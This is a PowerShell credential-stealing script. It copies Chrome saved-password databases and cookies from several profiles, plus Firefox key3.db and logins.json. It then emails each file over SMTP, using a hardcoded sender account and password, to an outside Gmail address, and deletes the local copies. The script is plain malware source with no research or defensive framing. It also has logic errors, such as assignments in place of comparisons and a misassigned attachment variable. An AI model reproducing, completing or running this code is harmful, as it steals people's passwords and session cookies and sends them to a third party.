$username=$env:Username

$From = "novicehckr@outlook.com"
$Pass = "IMMrr1aN"
$To = "9844417@gmail.com"
$Subject = "Browser password"
$Body = $username
$SMTPServer = "smtp.outlook.com"
$SMTPPort = "587"
$credentials = new-object Management.Automation.PSCredential $From, ($Pass | ConvertTo-SecureString -AsPlainText -Force)


$path1=$path2=$path3=$path4=0
if (Test-Path C:\Users\$username\AppData\Local\Google\Chrome\User` Data\Default\Login` Data)
{
	$chromeD="C:\Users\"+$username+"\AppData\Local\Google\Chrome\User Data\Default\Login Data";
	$path1=1
	copy-item -path $chromeD -destination D:/
	Rename-Item D:\Login` Data ChromeDataD
	$Attachment1 = "D:\ChromeDataD"
	
}


if (Test-Path C:\Users\$username\AppData\Local\Google\Chrome\User` Data\Profile` 1\Login` Data)
{
	$chrome1="C:\Users\"+$username+"\AppData\Local\Google\Chrome\User Data\Profile 1\Login Data"
	$path2=1
	copy-item -path $chrome1 -destination D:/
	Rename-Item D:\Login` Data ChromeDataP1
	$Attachment2 = "D:\ChromeDataP1"
}

if (Test-Path C:\Users\$username\AppData\Local\Google\Chrome\User` Data\Profile` 2\Login` Data)
{
	$chrome2="C:\Users\"+$username+"\AppData\Local\Google\Chrome\User Data\Profile 2\Login Data"
	$path3=1
	copy-item -path $chrome2 -destination D:/
	Rename-Item D:\Login` Data ChromeDataP2
	$Attachment3 = "D:\ChromeDataP2"
}

if (Test-Path C:\Users\$username\AppData\Local\Google\Chrome\User` Data\Default\Cookies)
{
	$chrome3="C:\Users\"+$username+"\AppData\Local\Google\Chrome\User Data\Default\Cookies"
	$path4=1
	copy-item -path $chrome3 -destination D:/
	Rename-Item D:\Cookies ChromeDataP23
	$Attachment3 = "D:\ChromeDataP23"
}



if($path1=1)
{
Send-MailMessage -From $From -to $To -Subject $Subject `
-Body $Body -SmtpServer $SMTPServer -port $SMTPPort -UseSsl `
-Credential $credentials -Attachments $Attachment1
Remove-Item D:\ChromeDataD

}

if($path2=1)
{
Send-MailMessage -From $From -to $To -Subject $Subject `
-Body $Body -SmtpServer $SMTPServer -port $SMTPPort -UseSsl `
-Credential $credentials -Attachments $Attachment2
Remove-Item D:\ChromeDataP1

}
if($path3=1)
{
Send-MailMessage -From $From -to $To -Subject $Subject `
-Body $Body -SmtpServer $SMTPServer -port $SMTPPort -UseSsl `
-Credential $credentials -Attachments $Attachment3
Remove-Item D:\ChromeDataP2

}

if($path4=1)
{
Send-MailMessage -From $From -to $To -Subject $Subject `
-Body $Body -SmtpServer $SMTPServer -port $SMTPPort -UseSsl `
-Credential $credentials -Attachments $Attachment4
Remove-Item D:\ChromeDataP23

}
 


$MPath="C:\Users\"+$username+"\AppData\Local\Mozilla\Firefox\Profiles"
if(Test-Path $MPath)
{

$profile=get-childitem $Mpath | where {$_.extension -eq '.default'}
$kpath= $Mpath + "\" + $profile.name+"\key3.db"
$lpath= $Mpath + "\" + $profile.name+"\logins.json"
if (Test-Path $kpath)
{

Send-MailMessage -From $From -to $To -Subject $Subject `
-Body $Body -SmtpServer $SMTPServer -port $SMTPPort -UseSsl `
-Credential $credentials -Attachments $kpath

}
if (Test-Path $lpath)
{

Send-MailMessage -From $From -to $To -Subject $Subject `
-Body $Body -SmtpServer $SMTPServer -port $SMTPPort -UseSsl `
-Credential $credentials -Attachments $lpath

}	
}
